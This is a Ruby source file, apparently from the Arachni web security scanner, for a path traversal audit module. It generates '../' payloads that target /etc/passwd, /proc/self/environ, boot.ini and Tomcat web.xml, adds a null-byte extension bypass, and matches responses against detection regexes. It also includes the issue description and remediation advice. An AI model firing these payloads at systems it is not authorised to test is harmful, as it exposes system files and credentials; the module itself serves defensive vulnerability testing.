=begin
    Copyright 2010-2014 Tasos Laskos <tasos.laskos@gmail.com>

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
=end

# Path Traversal audit module.
#
# @author Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>
#
# @version 0.4.2
#
# @see http://cwe.mitre.org/data/definitions/22.html
# @see http://www.owasp.org/index.php/Path_Traversal
# @see http://projects.webappsec.org/Path-Traversal
class Arachni::Modules::PathTraversal < Arachni::Module::Base

    MINIMUM_TRAVERSALS = 0
    MAXIMUM_TRAVERSALS = 6

    def self.options
        @options ||= {
            format: [Format::STRAIGHT],
            regexp: {
                unix: [
                    /DOCUMENT_ROOT.*HTTP_USER_AGENT/,
                    /(root|mail):.+:\d+:\d+:.+:[0-9a-zA-Z\/]+/im
                ],
                windows: [
                    /\[boot loader\](.*)\[operating systems\]/im,
                    /\[fonts\](.*)\[extensions\]/im
                ],
                tomcat: [
                    /<web\-app/im
                ]
            },

            # Add one more mutation (on the fly) which will include the extension
            # of the original value (if that value was a filename) after a null byte.
            each_mutation: proc do |mutation|
                m = mutation.dup

                # Figure out the extension of the default value, if it has one.
                ext = m.original[m.altered].to_s.split( '.' )
                ext = ext.size > 1 ? ext.last : nil

                # Null-terminate the injected value and append the ext.
                m.altered_value += "\x00.#{ext}"

                # Pass our new element back to be audited.
                m
            end
        }
    end

    def self.payloads
        return @payloads if @payloads

        @payloads = {
            unix:    [
                '/proc/self/environ',
                '/etc/passwd'
            ],
            windows: [
                'boot.ini',
                'windows/win.ini',
                'winnt/win.ini'
            ].map { |payload| [payload, "#{payload}#{'.'* 700}"] }.flatten
        }.inject({}) do |h, (platform, payloads)|
            h[platform] = payloads.map do |payload|
                trv = '/'
                (MINIMUM_TRAVERSALS..MAXIMUM_TRAVERSALS).map do
                    trv << '../'
                    [ "#{trv}#{payload}", "file://#{trv}#{payload}" ]
                end
            end.flatten

            h
        end

        @payloads[:tomcat] = [ '/../../', '../../', ].map do |trv|
             [ "#{trv}WEB-INF/web.xml", "file://#{trv}WEB-INF/web.xml" ]
        end.flatten

        @payloads
    end

    def run
        audit self.class.payloads, self.class.options
    end

    def self.info
        {
            name:        'Path Traversal',
            description: %q{It injects paths of common files (/etc/passwd and boot.ini)
                and evaluates the existence of a path traversal vulnerability
                based on the presence of relevant content in the HTML responses.},
            elements:    [ Element::FORM, Element::LINK, Element::COOKIE, Element::HEADER ],
            author:      'Tasos "Zapotek" Laskos <tasos.laskos@gmail.com> ',
            version:     '0.4.2',
            references:  {
                'OWASP' => 'http://www.owasp.org/index.php/Path_Traversal',
                'WASC'  => 'http://projects.webappsec.org/Path-Traversal'
            },
            targets:     %w(Unix Windows Tomcat),

            issue:       {
                name:            %q{Path Traversal},
                description:     %q{Web applications occasionally use
                    parameter values to store the location of a file required by
                    the server. An example of this is often seen in error pages 
                    where the actual file path for the error page is called the 
                    parameter value. For example 
                    'yoursite.com/error.php?page=404.php'. A path traversal 
                    occurs when the parameter value (ie. path to file being 
                    called by the server) can be substituted with the relative 
                    path of another resource which is located outside of the 
                    applications working directory (web root). The server then 
                    loads the resource and sends it in the response to the 
                    client. Cyber-criminals will abuse this vulnerability to 
                    view files that should otherwise not be accessible. A very 
                    common example of this on a *nix server is where the cyber-
                    criminal will access the /etc/passwd file to retrieve a list
                    of users on the server. This attack would look similar to 
                    'yoursite.com/error.php?page=../../../../etc/passwd'. As 
                    path traversal is based on the relative path, the payload 
                    must first traverse the file system to the root directory, 
                    and hence the string of '../../../../'. Arachni discovered 
                    that it was possible to substitute a parameter value with 
                    relative path to a common operating system file and have the 
                    contents of the file sent back in the response.},
                tags:            %w(path traversal injection regexp),
                cwe:             '22',
                severity:        Severity::HIGH,
                cvssv2:          '4.3',
                remedy_guidance: %q{It is recommended that untrusted or 
                    non-validated data is never used to form a literal file
                    include request. To validate data, the application should 
                    ensure that the supplied value for a file is permitted. This can
                    be achieved by performing whitelisting on the parameter 
                    value. The whitelist should contain a list of pages that 
                    the application is permitted to fetch resources from. If the 
                    supplied value does not match any value in the whitelist 
                    then the server should redirect to a standard error page. In 
                    some scenarios where dynamic content is being requested it 
                    may not be possible to perform validation of a list of 
                    trusted resources, therefor the list must also become 
                    dynamic (update as the files change), or perform filtering 
                    to remove any unrequired user input such as semicolons or 
                    periods etc. and only permit a-z0-9. It is also advised that 
                    sensitive file are not stored within the web root, and that 
                    the user permissions enforced by the directory are correct.},
                remedy_code:     '',
                metasploitable:  'unix/webapp/arachni_path_traversal'
            }

        }
    end

end
